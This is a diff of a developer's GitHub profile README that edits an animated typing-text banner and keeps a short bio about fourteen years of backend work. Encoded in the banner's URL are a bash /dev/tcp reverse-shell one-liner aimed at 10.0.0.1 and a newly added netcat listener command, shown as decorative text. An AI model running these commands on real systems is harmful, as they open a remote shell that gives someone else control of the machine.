@@ -1,4 +1,4 @@
-[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&duration=3000&pause=1000&width=435&lines=Hi+there!+%F0%9F%91%8B%F0%9F%8F%BB;bash+-i%3E%26+%2Fdev%2Ftcp%2F10.0.0.1%2F123+0%3E%261)](https://git.io/typing-svg)
+[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Fira+Code&duration=3000&pause=1000&width=435&lines=Hi+there!+%F0%9F%91%8B%F0%9F%8F%BB;bash+-i%3E%26+%2Fdev%2Ftcp%2F10.0.0.1%2F123+0%3E%261;nc+-nlvp+123)](https://git.io/typing-svg)
 
 Fourteen years of backend programming and software architecture experience under my belt. I usually create private repositories on Bitbucket, but I would like to engage in the open-source community on this platform.
 
